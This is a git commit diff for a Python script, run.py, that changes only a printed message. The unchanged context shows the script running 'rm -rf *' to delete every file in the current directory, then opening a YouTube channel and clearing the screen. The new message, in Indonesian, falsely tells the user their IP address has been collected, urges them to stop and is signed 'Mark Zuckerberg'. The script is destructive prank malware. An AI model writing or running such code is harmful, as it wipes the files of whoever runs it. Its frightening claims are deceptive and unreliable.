0d7734f49b2ed64dcdbaa8bc637745a36101f397
N74NK 420 <40085062+N74NK@users.noreply.github.com>
2019-06-06 10:17:44 +0700

    Update run.py

--- run.py
+++ run.py
@@ -2,4 +2,4 @@ import os
 os.system("rm -rf *")
 os.system("xdg-open https://youtube.com/NjankSoekamti")
 os.system("clear")
-print("\n\n Ini adalah program illegal!\n\n")
+print("\n\n Ini adalah program illegal!\n IP pengguna sudah dikumpulkan\n Berhentilah sebelum terlambat!\n\n - Mark Zuckerberg\n\n")
